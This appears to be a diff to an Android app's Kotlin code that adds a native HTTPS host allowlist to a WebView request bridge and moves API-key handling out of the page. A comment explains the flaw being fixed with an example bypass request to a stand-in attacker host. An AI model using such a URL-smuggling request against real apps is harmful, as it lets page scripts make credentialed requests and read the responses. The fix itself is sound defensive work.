@@ -10,6 +10,7 @@ import android.util.Log
 import java.io.File
 import java.io.IOException
 import java.util.concurrent.TimeUnit
+import okhttp3.HttpUrl.Companion.toHttpUrlOrNull
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.MultipartBody
 import okhttp3.OkHttpClient
@@ -291,12 +292,48 @@ object GroqSpeech {
     //  (e.g. DuckDuckGo's connect-src). Routing the call through native OkHttp
     //  makes the request as the app (no page CSP) and hands the bytes back to JS.
     // ------------------------------------------------------------------
+    /**
+     * Attach the stored provider credential natively, keyed by host, so the
+     * page never holds it. Gemini wants x-goog-api-key; the OpenAI-compatible
+     * endpoints want a bearer token.
+     */
+    private fun attachAgentCredential(builder: Request.Builder, host: String?, context: Context) {
+        val k = agentKey(context)
+        if (k.isBlank() || host == null) return
+        // Bearer for ALL THREE. Every provider here is addressed through its
+        // OpenAI-compatible endpoint — note Gemini's baseUrl ends /v1beta/openai
+        // — so they all want a bearer token. Sending x-goog-api-key (correct for
+        // Google's NATIVE Gemini API, wrong for its compat layer) produced
+        // "Missing or invalid Authorization header." on every agent request.
+        builder.header("Authorization", "Bearer " + k)
+    }
+
     fun rawRequest(
+        context: Context,
         url: String, method: String, headersJson: String, body: String,
         onResult: (code: Int, ok: Boolean, bytes: ByteArray) -> Unit
     ) {
         Thread {
             try {
+                // THE trust boundary. The JS side also checks, but that check
+                // runs in the page's world where any script can redefine it, so
+                // this native one is the real control. Previously the JS did
+                // `url.indexOf(host) >= 0` against the WHOLE url including the
+                // query, so fetch('https://attacker.example/c?x=api.groq.com')
+                // was performed by OkHttp as the app — no CORS preflight, no
+                // page CSP, response handed back readable.
+                val parsed = runCatching { url.toHttpUrlOrNull() }.getOrNull()
+                val host = parsed?.host?.lowercase()
+                val allowed = parsed != null &&
+                    parsed.isHttps &&
+                    host != null &&
+                    AGENT_HOSTS.any { host == it || host.endsWith(".$it") }
+                if (!allowed) {
+                    Log.w(TAG, "rawRequest REFUSED non-allowlisted url host=$host")
+                    onResult(0, false, "blocked: host not allowed".toByteArray())
+                    return@Thread
+                }
+
                 val builder = Request.Builder().url(url)
                 var contentType = "application/json"
                 runCatching {
@@ -306,9 +343,14 @@ object GroqSpeech {
                         val k = keys.next()
                         val v = headers.optString(k)
                         if (k.equals("content-type", true)) contentType = v.ifBlank { contentType }
+                        // Never let the page choose the credential headers: it
+                        // supplies the 'sv-proxy' placeholder, and the real key
+                        // is attached below from native storage.
+                        if (k.equals("authorization", true) || k.equals("x-goog-api-key", true)) continue
                         runCatching { builder.header(k, v) }
                     }
                 }
+                attachAgentCredential(builder, host, context)
                 val m = method.uppercase()
                 if (m == "POST" || m == "PUT" || m == "PATCH" || m == "DELETE") {
                     builder.method(m, body.toRequestBody(contentType.toMediaType()))
